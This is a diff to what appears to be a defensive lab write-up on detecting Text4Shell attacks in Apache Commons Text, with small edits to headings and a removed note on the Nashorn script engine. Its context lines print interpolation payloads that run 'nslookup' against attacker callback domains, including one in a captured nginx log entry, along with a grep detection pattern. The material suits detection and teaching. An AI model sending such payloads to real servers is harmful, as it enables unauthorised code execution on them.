@@ -47,8 +47,6 @@ Commons Text supports **string interpolation**: expressions in the form `${prefi
 3. The `script:` lookup **runs the embedded code**, or the `dns:` / `url:` lookup makes the server **connect out** to an attacker-controlled host.
 4. The attacker gets code execution, or at minimum an **out-of-band callback** confirming the target is vulnerable.
 
-> The `script:` vector relies on a JVM script engine (Nashorn), which was **removed in JDK 15+**, so `script:` payloads often fail on newer runtimes — though POCs targeting JDK 15+ have since been demonstrated. The `url:` and `dns:` vectors still work regardless, which is why the attacker in the lab tried all three.
-
 **Where payloads appear:** any input fed into interpolation — most commonly a **URL parameter** (as in this lab), but also POST data or headers.
 
 ---
@@ -64,7 +62,7 @@ ${dns:address:java.lang.Runtime.getRuntime().exec('nslookup <callback-domain>')}
 - `script:` → tries to execute code directly.
 - `dns:` / `url:` → force a lookup/connection to a domain the attacker controls.
 
-### Out-of-band (callback) probes
+### Out-of-band 
 As with Log4Shell, attackers confirm a hit by making the server **resolve a domain they control** (here via an embedded `nslookup`). If the attacker's DNS logs show the query, the target processed the payload. A **unique subdomain per request** tells them which target called back. Common callback services: interactsh, Burp Collaborator, dnslog, Canarytokens, and (in this lab) **messwithdns.com**.
 
 ### Encoding
@@ -123,7 +121,7 @@ grep -iE '\$\{(script|url|dns):|%24%7b(script|url|dns)' access.log \
 
 > **Note:** the broad search can throw false positives (`url` / `dns` are common words), so confirm the full `${...}` structure. And a WAF or log match finds the **attempt** — it doesn't prove the server was exploited.
 
-### Example nginx log entry (from the lab)
+### Example nginx log entry 
 ```
 234.180.146.216 - - [11/Jul/2023:23:01:29 +0000] "GET /hello.php?name=${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup emerald170.messwithdns.com')} HTTP/1.1" 200 2984 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/114.0.5735.199 Safari/537.36"
 ```
@@ -165,7 +163,7 @@ For Text4Shell:
 
 ![Images/06-Lab-Attacker-IP.png](Images/06-Lab-Attacker-IP.png)
 
-- Identify the **DNS server (callback domain)** the attacker tried to reach.
+- Identify the **DNS server** the attacker tried to reach.
 
 ![Images/06-Lab-DNS-Server.png](Images/06-Lab-DNS-Server.png)
 
